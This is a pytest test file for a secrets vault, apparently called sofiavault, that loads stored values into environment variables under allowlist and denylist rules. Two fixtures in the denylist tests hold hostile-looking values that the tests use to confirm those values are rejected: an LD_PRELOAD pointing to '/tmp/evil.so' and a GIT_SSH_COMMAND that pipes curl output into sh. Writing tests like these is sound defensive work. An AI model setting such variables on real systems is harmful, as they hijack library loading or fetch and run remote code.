"""D-1 allowlist files and D-2 LoadReport."""

import tempfile
from pathlib import Path

import pytest

from sofiavault import envload, paths
from sofiavault.envload import AllowListError, LoadReport, UnsafeVariableName
from sofiavault.vault import Vault

PW = "allowlist-pw"


def _vault() -> tuple[Vault, Path]:
    d = Path(tempfile.mkdtemp())
    v = Vault.create(d / "secrets.db", PW)
    v.set("env:database_url", "postgres://real")
    v.set("env:api_key", "sk-123")
    v.set("env:other_token", "not-mine")
    return v, d


def _allow_file(d: Path, text: str, name: str = "secrets.allow") -> Path:
    p = d / name
    p.write_text(text)
    return p


def test_T_1_1_allow_file_injects_only_listed_names_and_reports_denied():
    v, d = _vault()
    f = _allow_file(d, "# app secrets\nDATABASE_URL\n\n  api_key  # lower-case ok\n")
    env = {}
    report = envload.load(vault=v, environ=env, allow_file=f)
    assert isinstance(report, LoadReport)
    assert report.injected == ["API_KEY", "DATABASE_URL"]
    assert env == {"DATABASE_URL": "postgres://real", "API_KEY": "sk-123"}
    assert report.denied == {"OTHER_TOKEN": "not in allowlist"}
    assert report.vault_path == v.path
    al = envload.load_allowlist(f)
    assert al == {"DATABASE_URL", "API_KEY"} and al.path == f
    v.close()


def test_T_1_2_allow_and_allow_file_together_is_a_value_error():
    v, d = _vault()
    f = _allow_file(d, "API_KEY\n")
    opened = {"n": 0}
    with pytest.raises(ValueError):
        envload.load(vault=v, environ={}, allow=["API_KEY"], allow_file=f)
    with pytest.raises(ValueError):
        envload.load(path=d / "never-opened.db", allow=["A"], allow_file=f)
    assert opened["n"] == 0 and not (d / "never-opened.db").exists()
    v.close()


def test_T_1_3_malformed_name_in_allow_file_fails_closed():
    v, d = _vault()
    for bad in ("DATABASE_URL\n1BAD\n", "API KEY\n", "DATABASE_URL=x\n"):
        f = _allow_file(d, bad)
        env = {}
        with pytest.raises(AllowListError):
            envload.load(vault=v, environ=env, allow_file=f)
        assert env == {}
    v.close()


def test_T_1_4_env_default_allow_file(monkeypatch):
    v, d = _vault()
    monkeypatch.setattr(paths, "ALLOW_FILE", d / "missing.allow")
    with pytest.raises(AllowListError):
        envload.load(vault=v, environ={})
    monkeypatch.setattr(paths, "ALLOW_FILE", _allow_file(d, "# nothing\n\n"))
    with pytest.raises(AllowListError):
        envload.load(vault=v, environ={})
    monkeypatch.setattr(paths, "ALLOW_FILE", _allow_file(d, "API_KEY\n"))
    env = {}
    envload.load(vault=v, environ=env)
    assert env == {"API_KEY": "sk-123"}
    # explicit arguments beat the environment default
    env = {}
    envload.load(vault=v, environ=env, allow=["DATABASE_URL"])
    assert env == {"DATABASE_URL": "postgres://real"}
    monkeypatch.setattr(paths, "ALLOW_FILE", None)
    env = {}
    report = envload.load(vault=v, environ=env)      # denylist mode
    assert set(report.injected) == {"API_KEY", "DATABASE_URL", "OTHER_TOKEN"}
    assert report.denied == {}
    v.close()


def test_T_1_6_allowlist_never_widens_the_denylist():
    v, d = _vault()
    v.set("env:ld_preload", "/tmp/evil.so")
    v.set("env:sofiavault_key", "AAAA")
    env = {}
    with pytest.raises(UnsafeVariableName):
        envload.load(vault=v, environ=env, allow=["LD_PRELOAD", "API_KEY"])
    assert env == {}
    with pytest.raises(UnsafeVariableName):
        envload.load(vault=v, environ=env, allow=["SOFIAVAULT_KEY"])
    assert env == {}
    env = {}
    report = envload.load(vault=v, environ=env, allow=["LD_PRELOAD", "API_KEY"],
                          allow_unsafe_names=True)
    assert set(report.injected) == {"LD_PRELOAD", "API_KEY"}
    assert "SOFIAVAULT_KEY" not in env and "DATABASE_URL" not in env
    v.close()


def test_T_2_1_report_unpacks_as_the_old_pair():
    v, d = _vault()
    injected, skipped = envload.load(vault=v, environ={}, allow=["API_KEY"])
    assert injected == ["API_KEY"] and skipped == []
    assert envload.load(vault=v, environ={}, allow=["API_KEY"]) == (["API_KEY"], [])
    v.close()


def test_T_2_2_denied_lists_allowlist_exclusions_only_denylist_still_raises():
    v, d = _vault()
    report = envload.load(vault=v, environ={}, allow=["API_KEY"])
    assert report.denied == {"DATABASE_URL": "not in allowlist",
                             "OTHER_TOKEN": "not in allowlist"}
    v.set("env:git_ssh_command", "sh -c 'curl x|sh' #")
    env = {}
    with pytest.raises(UnsafeVariableName):
        envload.load(vault=v, environ=env, allow=["API_KEY"])
    assert env == {}
    with pytest.raises(UnsafeVariableName):
        envload.load(vault=v, environ=env)
    assert env == {}
    v.close()


def test_T_2_3_ambient_wins_unless_overwrite():
    v, d = _vault()
    env = {"API_KEY": "from-deploy"}
    report = envload.load(vault=v, environ=env, allow=["API_KEY", "DATABASE_URL"])
    assert report.skipped == ["API_KEY"] and report.injected == ["DATABASE_URL"]
    assert env["API_KEY"] == "from-deploy"
    report = envload.load(vault=v, environ=env, allow=["API_KEY"], overwrite=True)
    assert report.injected == ["API_KEY"] and report.skipped == []
    assert env["API_KEY"] == "sk-123"
    v.close()
